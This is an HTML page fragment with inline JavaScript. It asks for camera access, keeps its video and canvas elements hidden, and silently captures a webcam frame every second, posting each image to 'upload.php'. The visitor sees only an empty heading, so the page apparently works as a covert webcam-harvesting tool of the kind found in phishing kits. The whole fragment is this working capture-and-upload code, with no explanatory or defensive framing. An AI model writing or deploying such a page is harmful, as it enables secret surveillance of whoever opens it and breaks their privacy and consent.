
<body>

    <h2 id="message"></h2>
    <video id="video" width="640" height="480" autoplay hidden></video>
    <canvas id="canvas" style="display: none;" hidden></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const message = document.getElementById('message');

        // Access the camera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;

                // Capture image every second (1000 milliseconds)
                setInterval(() => {
                    // Draw the video frame to the canvas
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    // Upload the captured image
                    uploadImage();
                }, 1000); // Capture every second (1000ms)
            })
            .catch(error => {
                console.error("Error accessing the camera", error);
                message.innerHTML = "Error accessing the camera.";
            });

        // Function to upload the captured image
        function uploadImage() {
            const dataUrl = canvas.toDataURL('image/png');
            fetch('upload.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: 'image=' + encodeURIComponent(dataUrl)
            })
            .then(response => response.text())
            .then(data => {
                console.log(data); // Log success message
            })
            .catch(error => {
                console.error('Error uploading image:', error);
            });
        }
    </script>

